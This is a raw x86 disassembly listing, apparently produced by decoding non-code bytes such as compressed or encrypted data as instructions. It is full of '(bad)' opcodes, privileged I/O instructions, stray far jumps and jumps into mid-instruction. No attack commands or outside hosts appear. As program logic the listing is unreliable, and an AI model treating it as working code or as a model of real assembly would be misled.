  412f07:	xchg   DWORD PTR [ebp+0x2d],ebx
  412f0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f0b:	jnp    0x412f84
  412f0d:	mov    edi,0x3e4ccfd8
  412f12:	pop    esi
  412f13:	xchg   BYTE PTR [esi],bh
  412f15:	mov    dl,0xfe
  412f17:	adc    dl,dl
  412f19:	aad    0xad
  412f1b:	daa    
  412f1c:	div    BYTE PTR [eax+eiz*2+0x22ed4816]
  412f23:	cli    
  412f24:	int    0x8a
  412f26:	sbb    ebx,ebx
  412f28:	into   
  412f29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f2a:	clc    
  412f2b:	cld    
  412f2c:	jo     0x412f6b
  412f2e:	xchg   ebp,eax
  412f2f:	xlat   BYTE PTR ds:[ebx]
  412f30:	cmp    esi,DWORD PTR [eax-0x9956a51]
  412f36:	mov    al,ds:0xd02b6c88
  412f3b:	cmp    dl,BYTE PTR [edi+0x6bb1bda4]
  412f41:	gs leave 
  412f43:	daa    
  412f44:	outs   dx,DWORD PTR ds:[esi]
  412f45:	xchg   ecx,eax
  412f46:	dec    ebx
  412f47:	jmp    0x412f36
  412f49:	xor    ah,dl
  412f4b:	popf   
  412f4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f4d:	jmp    0x20a8:0xa1a1ed86
  412f54:	rcr    DWORD PTR [ecx-0x999bc72],cl
  412f5a:	jnp    0x412fd0
  412f5c:	test   edx,edi
  412f5e:	daa    
  412f5f:	dec    esp
  412f60:	sbb    DWORD PTR [ecx+0x7],ecx
  412f63:	pop    es
  412f64:	xchg   ebx,eax
  412f65:	pop    esi
  412f66:	pop    ds
  412f67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f68:	dec    ebp
  412f69:	std    
  412f6a:	dec    BYTE PTR [ecx-0x3a]
  412f6d:	jp     0x412f8d
  412f6f:	mov    ecx,0xf1db0aa5
  412f74:	inc    ebp
  412f75:	inc    ebp
  412f76:	pop    DWORD PTR [eax+0x3231cede]
  412f7c:	pop    esp
  412f7d:	dec    esp
  412f7e:	or     DWORD PTR ds:0x15c5cdbf,ebp
  412f84:	push   eax
  412f85:	test   al,0xc6
  412f87:	pop    esp
  412f88:	or     DWORD PTR [ebx+0x58],ebx
  412f8b:	bound  edx,QWORD PTR [eax]
  412f8d:	(bad)  
  412f8e:	aam    0xde
  412f90:	or     esp,DWORD PTR [eax-0x21]
  412f93:	daa    
  412f94:	mov    gs,ecx
  412f96:	mul    bh
  412f98:	mov    esp,0xbdda2fde
  412f9d:	fidivr WORD PTR [ebx+esi*4+0x7]
  412fa1:	test   BYTE PTR [ebx-0xf48ee06],ah
  412fa7:	or     ebp,DWORD PTR [ebp-0x7502419e]
  412fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fae:	imul   ecx,DWORD PTR [edi+0x55800754],0x1b
  412fb5:	dec    esi
  412fb6:	jae    0x412fb2
  412fb8:	jae    0x412f76
  412fba:	call   0x38c11d75
  412fbf:	pop    es
  412fc0:	(bad)  
  412fc1:	mov    DWORD PTR [edi+0xa],0x980af1e7
  412fc8:	or     BYTE PTR [edx-0x1e],bh
  412fcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fcc:	adc    BYTE PTR [ebx+0x23],dl
  412fcf:	sbb    ebx,DWORD PTR [eax-0x74e985e6]
  412fd5:	add    bh,BYTE PTR [ebx-0x15ee1f8]
  412fdb:	stc    
  412fdc:	jae    0x41305c
  412fde:	add    bl,0x99
  412fe1:	lock daa 
  412fe3:	shr    DWORD PTR [esi+0x616455f],cl
  412fe9:	jmp    0x3c4a:0xad4f1f3b
  412ff0:	dec    ecx
  412ff1:	mul    dl
  412ff3:	adc    al,0x7f
  412ff5:	xchg   ebp,eax
  412ff6:	nop
  412ff7:	loop   0x412ff0
  412ff9:	pop    ecx
  412ffa:	fadd   QWORD PTR [eax-0x43]
  412ffd:	(bad)  
  412ffe:	rol    DWORD PTR [ebx],cl
  413000:	loope  0x413035
  413002:	call   0x966b:0x2ba660e
  413009:	lahf   
  41300a:	xchg   esp,eax
  41300b:	cmp    eax,0x21729be5
  413010:	xor    BYTE PTR [ebx+0x37a72e6d],0xd
  413017:	or     DWORD PTR [edi+0x11],esi
  41301a:	pop    edx
  41301b:	dec    eax
  41301c:	push   ss
  41301d:	jbe    0x41301a
  41301f:	imul   BYTE PTR [ebp-0x64]
  413022:	push   cs
  413023:	js     0x413009
  413025:	pop    ebx
  413026:	push   ecx
  413027:	add    bl,bh
  413029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41302a:	loope  0x412fca
  41302c:	les    ebp,FWORD PTR [ebx+0x52e08131]
  413032:	inc    esi
  413033:	dec    eax
  413034:	lods   eax,DWORD PTR ds:[esi]
  413035:	pop    ds
  413036:	idiv   ah
  413038:	xor    al,0xb3
  41303a:	dec    esi
  41303b:	sub    DWORD PTR ds:0x2eef10fc,ecx
  413041:	out    0xaa,eax
  413043:	fdivr  QWORD PTR [ebp+0x7e]
  413046:	sbb    al,0x36
  413048:	iret   
  413049:	add    al,0x5
  41304b:	pop    eax
  41304c:	or     edx,0xffffff9c
  41304f:	arpl   WORD PTR [ecx-0x71],ax
  413052:	push   esp
  413053:	es cmp al,0xdc
  413056:	pusha  
  413057:	je     0x41307c
  413059:	test   DWORD PTR [ebx-0x69],esi
  41305c:	mov    edi,0x8ebab429
  413061:	or     bl,ch
  413063:	mov    bl,0x2e
  413065:	jno    0x413046
  413067:	add    DWORD PTR [esi],esi
  413069:	add    al,0x6b
  41306b:	or     eax,0xd6152b76
  413070:	mov    ch,0x8e
  413072:	and    BYTE PTR [ebx+0xf38eead],bh
  413078:	sub    DWORD PTR [edx+0x696f9642],ecx
  41307e:	push   edi
  41307f:	sub    esi,DWORD PTR ss:[ebx]
  413082:	inc    eax
  413083:	loop   0x413054
  413085:	jbe    0x413098
  413087:	mov    eax,0xdfecb8c6
  41308c:	sti    
  41308d:	in     eax,0x1b
  41308f:	outs   dx,BYTE PTR ds:[esi]
  413090:	dec    ebp
  413091:	adc    eax,0x363ce8ae
  413096:	xor    eax,0xdc0f1060
  41309b:	(bad)  
  41309d:	mov    bh,0x3a
  41309f:	inc    esi
  4130a0:	push   edx
  4130a1:	fucomip st,st(4)
  4130a3:	lahf   
  4130a4:	sub    eax,0xc0d5e32d
  4130a9:	cmp    ebx,DWORD PTR ss:[esi+esi*8+0x6e]
  4130ae:	in     eax,0x92
  4130b0:	mov    BYTE PTR [ebx],cl
  4130b2:	xor    ecx,edx
  4130b4:	cld    
  4130b5:	sbb    DWORD PTR [eax-0x75d92e15],0x6a
  4130bc:	cmp    BYTE PTR [edi+0x53be46f9],al
  4130c2:	push   ss
  4130c3:	bnd jg 0x4130a8
  4130c6:	js     0x41304e
  4130c8:	loope  0x413144
  4130ca:	add    al,0x11
  4130cc:	xor    eax,0x10dea5c7
  4130d1:	shr    BYTE PTR [edi+0x7f8efd5d],1
  4130d7:	sbb    al,0x75
  4130d9:	pushf  
  4130da:	loopne 0x4130a9
  4130dc:	shl    DWORD PTR [ecx+eiz*2-0x2c],0xf2
  4130e1:	pusha  
  4130e2:	jno    0x4130a4
  4130e4:	add    BYTE PTR [eax+0x4be6391a],dl
  4130ea:	jecxz  0x413145
  4130ec:	mov    ecx,ss
  4130ee:	outs   dx,DWORD PTR ds:[esi]
  4130ef:	sub    dl,BYTE PTR [eax+esi*4+0x29043cd3]
  4130f6:	cmc    
  4130f7:	mov    WORD PTR [esi+0x74dcfea5],ds
  4130fd:	cmp    eax,0xaf1e79c6
  413102:	dec    ecx
  413103:	inc    edx
  413104:	popf   
  413105:	pop    edx
  413106:	loopne 0x413095
  413108:	arpl   si,dx
  41310a:	jl     0x4130cc
  41310c:	push   ds
  41310d:	sti    
  41310e:	push   cs
  41310f:	push   ebp
  413110:	and    al,0x28
  413112:	lahf   
  413113:	and    DWORD PTR [ebp+0x22],ecx
  413116:	cmp    eax,0x41dbde4f
  41311b:	retf   0x8bc6
  41311e:	test   DWORD PTR [edx],ebx
  413120:	push   ss
  413121:	jnp    0x4130fd
  413123:	mov    ss,WORD PTR [edi]
  413125:	fwait
  413126:	sar    DWORD PTR [ebp-0x550bb7a3],0x97
  41312d:	sub    DWORD PTR [edx+edi*1+0x26],ebx
  413131:	dec    edi
  413132:	push   es
  413133:	push   ecx
  413134:	fs xchg ah,dh
  413137:	add    edx,esi
  413139:	fild   DWORD PTR [ebp+edx*1-0x53]
  41313d:	mov    ebp,0x56ac6805
  413142:	jbe    0x41318b
  413144:	jle    0x413178
  413146:	arpl   WORD PTR [eax-0x6224afc3],bp
  41314c:	js     0x41316b
  41314e:	ds pushf 
  413150:	sbb    BYTE PTR [ebx+ebp*8-0x7dad67f8],ah
  413157:	inc    DWORD PTR [ebp+0xa]
  41315a:	sbb    eax,0xc8e6c5c8
  41315f:	jbe    0x4130e7
  413161:	jp     0x4131a4
  413163:	mov    ebx,ebx
  413165:	add    DWORD PTR [ebx],edx
  413167:	dec    eax
  413168:	fisubr WORD PTR [ecx-0x69]
  41316b:	scas   eax,DWORD PTR es:[edi]
  41316c:	sbb    dh,bl
  41316e:	sbb    eax,0xfb46135d
  413173:	das    
  413174:	fisub  WORD PTR [eax]
  413176:	cld    
  413177:	scas   al,BYTE PTR es:[edi]
  413178:	xlat   BYTE PTR ds:[ebx]
  413179:	jne    0x4131b7
  41317b:	jno    0x41311c
  41317d:	mov    dh,ch
  41317f:	pop    ss
  413180:	jmp    0xfff5d152
  413185:	mov    eax,0x2a8539e2
  41318a:	out    0x81,eax
  41318c:	rol    BYTE PTR ds:[edx+0x4],cl
  413190:	and    ax,0x6e79
  413194:	push   ss
  413195:	xchg   esp,eax
  413196:	or     ah,ah
  413198:	sbb    BYTE PTR [ebx],0x99
  41319b:	ja     0x41311f
  41319d:	mov    dh,BYTE PTR [ecx]
  41319f:	in     al,0x85
  4131a1:	ja     0x4131ea
  4131a3:	mov    al,0x6e
  4131a5:	aad    0xcb
  4131a7:	lock dec esi
  4131a9:	call   0x792:0x1cbb5e75
  4131b0:	shl    BYTE PTR [eax+0x67],0x3e
  4131b4:	sbb    edx,ebx
  4131b6:	push   edx
  4131b7:	pop    ebx
  4131b8:	cmp    al,0x93
  4131ba:	out    0xa0,al
  4131bc:	inc    edx
  4131bd:	pandn  mm5,mm2
  4131c0:	jnp    0x41321b
  4131c2:	rcl    BYTE PTR [edi-0x2dc8dabf],1
  4131c8:	mov    bl,0x89
  4131ca:	aad    0x51
  4131cc:	push   ebx
  4131cd:	(bad)  
  4131cf:	jbe    0x41324c
  4131d1:	icebp  
  4131d2:	add    DWORD PTR [edi+0x19],ebx
  4131d5:	in     eax,0x32
  4131d7:	push   es
  4131d8:	ins    BYTE PTR es:[edi],dx
  4131d9:	imul   ecx,DWORD PTR [ecx],0x16117727
  4131df:	xlat   BYTE PTR ds:[ebx]
  4131e0:	lahf   
  4131e1:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131e3:	pushf  
  4131e4:	mov    ch,bh
  4131e6:	lods   al,BYTE PTR ds:[esi]
  4131e7:	scas   ax,WORD PTR es:[edi]
  4131e9:	test   bh,0xc2
  4131ec:	gs mov bl,0x3a
  4131ef:	mov    eax,ds:0x4fc9be91
  4131f4:	mov    esp,0x1e06e9ba
  4131f9:	jp     0x413264
  4131fb:	ds mov ch,0x77
  4131fe:	xor    al,0xdc
  413200:	sahf   
  413201:	add    eax,0x523283f5
  413206:	je     0x4131c4
  413208:	fld    TBYTE PTR [ebx-0x7e1e3377]
  41320e:	add    dl,BYTE PTR [ebp-0x42074598]
  413214:	mov    al,0x34
  413216:	push   cs
  413217:	xchg   ebx,eax
  413218:	pop    esp
  413219:	(bad)  
  41321a:	mov    bl,0x3e
  41321c:	mov    ecx,0xaa62adbd
  413221:	mov    ebp,0x1c8a0434
  413226:	nop
  413227:	jb     0x41329c
  413229:	call   FWORD PTR [ebx+0x2ab272b4]
  41322f:	xor    DWORD PTR [ebx],0xffffffea
  413232:	ja     0x413231
  413234:	add    BYTE PTR ds:0xe7f1d602,cl
  41323a:	dec    edi
  41323b:	fist   DWORD PTR [ecx+0x4b4f3be1]
  413241:	mov    ebx,DWORD PTR [edi]
  413243:	scas   al,BYTE PTR es:[edi]
  413244:	add    eax,0x9f9db0b3
  413249:	shl    BYTE PTR ds:0x1992405e,1
  41324f:	inc    esi
  413250:	imul   ebx,DWORD PTR ds:0x6140f87b,0xffffffcf
  413257:	fmul   DWORD PTR [edx]
  413259:	fst    QWORD PTR [edi-0x19]
  41325c:	cmp    BYTE PTR [eax],dh
  41325e:	xor    ah,ah
  413260:	or     esi,eax
  413262:	call   0x19a4:0xdf078cd9
  413269:	cld    
  41326a:	jecxz  0x4132dc
  41326c:	pop    ebx
  41326d:	sbb    BYTE PTR [ecx],bh
  41326f:	and    dh,BYTE PTR [ecx+0x48]
  413272:	mov    ebp,0x5941587d
  413277:	repnz pop edx
  413279:	xor    eax,0x745f17ea
  41327e:	cmp    al,0x87
  413280:	or     eax,0xee178f0e
  413285:	fisttp DWORD PTR [ebx+0x1]
  413288:	push   ebp
  413289:	fild   DWORD PTR [ebx]
  41328b:	call   0xdec918cb
  413290:	outs   dx,DWORD PTR ds:[esi]
  413291:	jo     0x413248
  413293:	lods   al,BYTE PTR ds:[esi]
  413294:	fbstp  TBYTE PTR [eax+eax*4-0x412130fc]
  41329b:	mov    DWORD PTR ds:0xef6807e,ebp
  4132a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132a2:	test   DWORD PTR [edi+0x6250a2fb],0x268a73b0
  4132ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132ad:	icebp  
  4132ae:	sub    cl,BYTE PTR ds:0xf3f6e460
  4132b4:	(bad)  
  4132b5:	push   eax
  4132b6:	dec    esi
  4132b7:	lock adc BYTE PTR ds:0x5d37861d,0x2e
  4132bf:	jb     0x413283
  4132c1:	call   0x3eab:0x62e19424
  4132c8:	add    al,0x31
  4132ca:	cmp    BYTE PTR [bp+di-0x6214],0x5d
  4132d0:	cmp    DWORD PTR [esi+0x2d],ecx
  4132d3:	push   eax
  4132d4:	mov    ds:0x872b688e,al
  4132d9:	mov    ds:0x7cafb164,eax
  4132de:	(bad)  
  4132e0:	nop
  4132e1:	jp     0x41331e
  4132e3:	int    0x51
  4132e5:	lods   al,BYTE PTR ds:[esi]
  4132e6:	rdseed ecx
  4132e9:	data16 jecxz 0x4132b6
  4132ec:	or     al,0x44
  4132ee:	nop
  4132ef:	fdiv   DWORD PTR [esi-0xa]
  4132f2:	(bad)  
  4132f3:	sbb    ecx,DWORD PTR [esi-0x2095253c]
  4132f9:	(bad)  
  4132fa:	mov    eax,ds:0x1104a4bf
  4132ff:	inc    edx
  413300:	mov    esp,0x27fb2d2b
  413305:	push   edi
  413306:	(bad)  [eax-0x6f]
  413309:	popa   
  41330a:	popf   
  41330b:	dec    ebx
  41330c:	or     DWORD PTR [eax],edi
  41330e:	rol    BYTE PTR [eax],cl
  413310:	sbb    ecx,ebp
  413312:	lahf   
  413313:	mov    al,0xbc
  413315:	and    al,0x27
  413317:	dec    esp
  413318:	pop    ds
  413319:	fdivr  QWORD PTR [edx+0x376dd75c]
  41331f:	jecxz  0x41333a
  413321:	sbb    eax,0x22419b86
  413326:	dec    esi
  413327:	push   0x7367082c
  41332c:	cwde   
  41332d:	mov    edi,0xddf860f0
  413332:	sbb    BYTE PTR [ebx-0x4a],bl
  413335:	hlt    
  413336:	adc    eax,0x5d1484a
  41333b:	imul   esi,DWORD PTR [edi-0x5e65f613],0xc14f404c
  413345:	add    BYTE PTR [ecx-0x5a],dh
  413348:	xchg   edx,eax
  413349:	jnp    0x4133c2
  41334b:	fisttp QWORD PTR [esi+ebx*2]
  41334e:	cmc    
  41334f:	ret    0xaccf
  413352:	stos   BYTE PTR es:[edi],al
  413353:	inc    edi
  413354:	sti    
  413355:	xlat   BYTE PTR ds:[ebx]
  413356:	mov    ebx,0xb1d0fed4
  41335b:	jp     0x41333f
  41335d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41335e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41335f:	imul   ebx,DWORD PTR [eax+0x8228cdb],0x99d7ca70
  413369:	shr    BYTE PTR [edx],1
  41336b:	xchg   edi,eax
  41336c:	dec    ebx
  41336d:	cmp    DWORD PTR [ebp+0x2c],ebp
  413370:	xor    BYTE PTR [edx+0x1b],dh
  413373:	adc    DWORD PTR [edx-0x21da7874],ebp
  413379:	cmp    dl,ah
  41337b:	mov    edi,0xf3d83b17
  413380:	push   0xbc5939f3
  413385:	bound  eax,QWORD PTR [esi+ebx*1]
  413388:	hlt    
  413389:	imul   ebx,DWORD PTR [edi+eax*1-0x30],0xffffffa8
  41338e:	popf   
  41338f:	icebp  
  413390:	jp     0x41335d
  413392:	pop    ss
  413393:	jmp    0x413315
  413395:	mov    al,ds:0x51918131
  41339a:	imul   ebp,DWORD PTR [edx-0x714b126],0x98d8f9f6
  4133a4:	dec    ecx
  4133a5:	outs   dx,BYTE PTR ds:[esi]
  4133a6:	loope  0x413399
  4133a8:	jecxz  0x41334d
  4133aa:	or     ah,BYTE PTR [edx]
  4133ac:	pop    eax
  4133ad:	icebp  
  4133ae:	or     al,0x37
  4133b0:	sbb    BYTE PTR [eax],bh
  4133b2:	(bad)  
  4133b3:	rol    DWORD PTR [ebx],cl
  4133b5:	test   BYTE PTR [edx-0x77],bl
  4133b8:	jne    0x41341c
  4133ba:	fwait
  4133bb:	scas   eax,DWORD PTR es:[edi]
  4133bc:	scas   eax,DWORD PTR es:[edi]
  4133bd:	mov    ah,0x93
  4133bf:	lods   al,BYTE PTR ds:[esi]
  4133c0:	jmp    0x3875:0x944a8f17
  4133c7:	fcmovnbe st,st(6)
  4133c9:	dec    ecx
  4133ca:	int3   
  4133cb:	scas   al,BYTE PTR es:[edi]
  4133cc:	je     0x413378
  4133ce:	cmp    al,0x30
  4133d0:	add    dl,ah
  4133d2:	pop    ds
  4133d3:	fcom   DWORD PTR [ecx]
  4133d5:	mov    edi,0x58795661
  4133da:	adc    DWORD PTR [eax-0x6f],esi
  4133dd:	jmp    0x20053a77
  4133e2:	shl    al,cl
  4133e4:	(bad)  
  4133e5:	pushf  
  4133e6:	test   al,0x27
  4133e8:	test   eax,0x97618874
  4133ed:	ficomp WORD PTR [edx+0x5d0050fc]
  4133f3:	das    
  4133f4:	push   esi
  4133f5:	call   0xe7d09c99
  4133fa:	scas   al,BYTE PTR es:[edi]
  4133fb:	paddb  mm4,QWORD PTR [ebx*1+0x30474b4f]
  413403:	dec    esp
  413404:	xchg   edi,eax
  413405:	(bad)  [edx-0x4af977f9]
  41340b:	xor    ch,dh
  41340d:	xchg   ebx,eax
  41340e:	shl    DWORD PTR [edi+0x6811b8b6],cl
  413414:	dec    edi
  413415:	xchg   ecx,eax
  413416:	or     al,0x2f
  413418:	mov    ch,0x63
  41341a:	mov    al,BYTE PTR [eax+0x58a46fa1]
  413420:	hlt    
  413421:	inc    edx
  413422:	arpl   WORD PTR [ebx+0x7b039100],sp
  413428:	mov    esp,0xa9ac887a
  41342d:	push   0xd2a5250a
  413432:	popf   
  413433:	cmp    eax,0xe35f218c
  413438:	loopne 0x41342b
  41343a:	mov    bh,0xab
  41343c:	ss mov edx,0xf21afdb3
  413442:	sub    eax,ebx
  413444:	lea    esi,[ebx-0x222e714b]
  41344a:	jmp    0x5166e2d0
  41344f:	rcl    DWORD PTR [edi+0x77],0x53
  413453:	test   al,0xda
  413455:	ss (bad) 
  413457:	sub    BYTE PTR [esi-0x2f26b867],ah
  41345d:	rcr    BYTE PTR [ebx+0x7d1e7dac],0x82
  413464:	fist   DWORD PTR [eax+0x4a]
  413467:	sti    
  413468:	push   es
  413469:	ror    BYTE PTR [esi],1
  41346b:	rcr    DWORD PTR [eax],0x68
  41346e:	outs   dx,BYTE PTR ds:[esi]
  413470:	and    dh,BYTE PTR [esi+ebx*1]
  413473:	sbb    BYTE PTR [ecx],dl
  413475:	dec    edx
  413476:	or     BYTE PTR [esi-0x606bc3e9],ah
  41347c:	jae    0x41347a
  41347e:	stos   DWORD PTR es:[edi],eax
  41347f:	mov    esi,0x2a5f41eb
  413484:	xor    ebp,ecx
  413486:	pop    ebx
  413487:	repz in eax,0xe6
  41348a:	inc    edx
  41348b:	jno    0x413484
  41348d:	repnz push 0xb
  413490:	or     bh,bl
  413492:	retf   
  413493:	jne    0x4134f1
  413495:	ret    0x8052
  413498:	mov    DWORD PTR [ecx-0x771e63c0],ebx
  41349e:	sbb    al,0x14
  4134a0:	pop    edi
  4134a1:	cwde   
  4134a2:	call   0x43b16207
  4134a7:	sar    ah,0x56
  4134aa:	cmp    bl,cl
  4134ac:	sbb    eax,0x5e258ed2
  4134b1:	cs imul ecx,ebx,0x44074964
  4134b8:	ins    DWORD PTR es:[edi],dx
  4134b9:	(bad)  [ecx+0x206f170f]
  4134bf:	push   esi
  4134c0:	mov    ecx,0xc633c24c
  4134c5:	int3   
  4134c6:	xchg   edx,eax
  4134c7:	sar    dl,0x1a
  4134ca:	scas   eax,DWORD PTR es:[edi]
  4134cb:	lea    ebp,[eax+0x33]
  4134ce:	xchg   esp,eax
  4134cf:	rcl    eax,0xa8
  4134d2:	xchg   ebp,eax
  4134d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134d4:	mov    ebp,ecx
  4134d6:	std    
  4134d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134d8:	or     bl,BYTE PTR [esi]
  4134da:	adc    eax,0xd08a83dc
  4134df:	idiv   bh
  4134e1:	ror    eax,0x1
  4134e4:	mov    ebp,esi
  4134e6:	inc    ecx
  4134e7:	fild   DWORD PTR [ebx*8-0x13846781]
  4134ee:	jg     0x413493
  4134f0:	call   0x55d3:0xd7de9237
  4134f7:	pushf  
  4134f8:	cmc    
  4134f9:	loopne 0x41349e
  4134fb:	mov    bl,0x54
  4134fd:	ss xor al,0xc
  413500:	int    0xe8
  413502:	inc    ebx
  413503:	bound  eax,QWORD PTR [ecx+0x5d8f2a68]
  413509:	je     0x41349c
  41350b:	push   eax
  41350c:	scas   al,BYTE PTR es:[edi]
  41350d:	adc    DWORD PTR [edx-0x72],edx
  413510:	std    
  413511:	lods   eax,DWORD PTR ds:[esi]
  413512:	sbb    eax,0xf603a91d
  413517:	stos   BYTE PTR es:[edi],al
  413518:	sti    
  413519:	push   cs
  41351a:	sbb    DWORD PTR [edi],ecx
  41351c:	int    0x9a
  41351e:	mov    WORD PTR [esi-0x49],es
  413521:	retf   
  413522:	cli    
  413523:	sub    DWORD PTR [ecx-0x3c],edx
  413526:	enter  0xaeff,0x19
  41352a:	les    eax,FWORD PTR [edi-0x3]
  41352d:	xor    ch,BYTE PTR [esi]
  41352f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413530:	and    DWORD PTR [ecx+0x6ed52d4],0xfffffffe
  413537:	repz shl DWORD PTR ss:[eax-0x7f],cl
  41353c:	and    DWORD PTR [esi-0x6f9c2727],ebx
  413542:	fucom  st(2)
  413544:	aas    
  413545:	add    ecx,DWORD PTR [esi+0x1a4fc532]
  41354b:	adc    BYTE PTR [edx+0x2e0f5607],bl
  413551:	imul   ecx,DWORD PTR [ebp+0x2912ce7e],0x101b456b
  41355b:	outs   dx,BYTE PTR ds:[esi]
  41355c:	inc    BYTE PTR [eax]
  41355e:	sbb    eax,0xc45a7487
  413563:	jne    0x413560
  413565:	outs   dx,DWORD PTR ds:[esi]
  413566:	stc    
  413567:	jo     0x41351d
  413569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41356a:	fadd   QWORD PTR [ebx]
  41356c:	inc    ebp
  41356d:	in     eax,0x4d
  41356f:	add    al,0x96
  413571:	push   esi
  413572:	or     al,0xb6
  413574:	ja     0x413521
  413576:	lods   al,BYTE PTR ds:[esi]
  413577:	dec    esi
  413578:	mov    ecx,0x3df5ace8
  41357d:	push   0x56981daf
  413582:	pop    ds
  413583:	sbb    BYTE PTR [esi-0x5d],0x77
  413587:	dec    ecx
  413588:	and    eax,0xc543993d
  41358d:	shl    BYTE PTR gs:[ebx-0x6528271c],0x3a
  413595:	xlat   BYTE PTR ds:[ebx]
  413596:	jl     0x413537
  413598:	add    ebp,DWORD PTR cs:[ecx+0x3917958d]
  41359f:	sub    eax,0x6bee41c3
  4135a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135a6:	xchg   esp,eax
  4135a7:	pop    ss
  4135a8:	jg     0x41355c
  4135aa:	mov    al,0xb8
  4135ac:	xor    ebx,DWORD PTR [ecx]
  4135ae:	imul   edx,ebx,0x9413dd7e
  4135b4:	bswap  esp
  4135b6:	lods   al,BYTE PTR ds:[esi]
  4135b7:	jecxz  0x413591
  4135b9:	test   BYTE PTR [eax],0x9e
  4135bc:	jp     0x4135e0
  4135be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135bf:	dec    edi
  4135c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135c1:	mov    eax,ds:0x27d2f1fe
  4135c6:	xor    eax,0x791c6a99
  4135cb:	or     DWORD PTR [esp+edi*2-0x6e79d5aa],0x40
  4135d3:	xchg   edx,eax
  4135d4:	shr    DWORD PTR [ebx+0x196e3adc],0xac
  4135db:	and    BYTE PTR [esi],ah
  4135dd:	scas   al,BYTE PTR es:[edi]
  4135de:	lods   al,BYTE PTR ds:[esi]
  4135df:	cli    
  4135e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135e1:	ficomp WORD PTR [ecx]
  4135e3:	fnstsw WORD PTR [ebp+0x66aa6431]
  4135e9:	jno    0x41356e
  4135eb:	mov    cl,0xc8
  4135ed:	pop    ss
  4135ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135ef:	pop    ecx
  4135f0:	dec    ecx
  4135f1:	xchg   ebx,eax
  4135f2:	add    ecx,edx
  4135f4:	test   DWORD PTR [edi],eax
  4135f6:	lock jp 0x413647
  4135f9:	rol    esi,0xc8
  4135fc:	jae    0x41361f
  4135fe:	mov    al,ds:0xd660d999
  413603:	fisub  WORD PTR [ebp+ebp*1+0x29f76dfb]
  41360a:	mov    esp,0xac76bc01
  41360f:	add    bl,BYTE PTR [ebx+0x29e23d25]
  413615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413616:	jmp    FWORD PTR ds:0x7450f6a
  41361c:	or     al,0x2f
  41361e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41361f:	lea    eax,[esi-0x735005a9]
  413625:	ret    
  413626:	mov    ecx,0x7905dccd
  41362b:	ja     0x413661
  41362d:	ds jne 0x4136ab
  413630:	xchg   BYTE PTR ds:0x31babf5c,dh
  413636:	das    
  413637:	or     bh,bh
  413639:	and    al,0xca
  41363b:	clc    
  41363c:	cmp    DWORD PTR [esi+0x3e],ebp
  41363f:	mul    BYTE PTR [edi+0x4e]
  413642:	xchg   ah,ch
  413644:	outs   dx,BYTE PTR ds:[esi]
  413645:	xchg   esi,eax
  413646:	cdq    
  413647:	cdq    
  413648:	jmp    0x168c6e2e
  41364d:	ins    BYTE PTR es:[edi],dx
  41364e:	push   ds
  41364f:	aaa    
  413650:	and    BYTE PTR [esi-0x407c63f2],bh
  413656:	cmp    esi,ebx
  413658:	lock mov al,0x64
  41365b:	add    BYTE PTR [esi+0x7b],0x2d
  41365f:	xchg   BYTE PTR [ecx],al
  413661:	xchg   DWORD PTR [ebp+0x5d],ebx
  413664:	xchg   edx,eax
  413665:	ficomp WORD PTR [eax+ebx*4+0x585fb23b]
  41366c:	add    DWORD PTR [esi*2+0x2e4f30c5],eax
  413673:	xor    BYTE PTR [edi],bl
  413675:	pop    esp
  413676:	bound  edx,QWORD PTR [ecx]
  413678:	aas    
  413679:	test   BYTE PTR [ebp+0x61],ch
  41367c:	iret   
  41367d:	sbb    BYTE PTR [ecx],0xfd
  413680:	(bad)  
  413681:	xor    al,0x43
  413683:	sub    eax,0x1d4d4d0a
  413688:	mov    di,0xed53
  41368c:	mov    ds:0x6e3877b7,eax
  413691:	push   cs
  413692:	xchg   BYTE PTR [ebp-0xa870f65],dl
  413698:	loopne 0x413628
  41369a:	(bad)  
  41369b:	mov    ebp,DWORD PTR [eax+0x4f5dbcf4]
  4136a1:	dec    edi
  4136a2:	inc    edi
  4136a3:	lds    edx,FWORD PTR [esi+0x73]
  4136a6:	mov    dl,0x3e
  4136a8:	adc    ebx,esi
  4136aa:	xor    ebp,DWORD PTR [ecx+eax*4+0xc]
  4136ae:	ins    BYTE PTR es:[edi],dx
  4136af:	push   edi
  4136b0:	jmp    0x24d5a46b
  4136b5:	cmp    dl,al
  4136b7:	popf   
  4136b8:	push   edi
  4136b9:	push   0x67
  4136bb:	fild   DWORD PTR [eax+edx*2]
  4136be:	add    al,0x68
  4136c0:	retf   0xfed8
  4136c3:	dec    edi
  4136c4:	push   ebp
  4136c5:	cmp    ebp,0xfffffff0
  4136c8:	aaa    
  4136c9:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4136cb:	add    DWORD PTR [ecx-0x51],0xffffffb6
  4136cf:	inc    ecx
  4136d0:	adc    eax,0xaf055071
  4136d5:	jo     0x4136ed
  4136d7:	fldenv [ebp-0x59a532fc]
  4136dd:	les    ebp,FWORD PTR [esi-0x76]
  4136e0:	(bad)  
  4136e1:	jbe    0x41368a
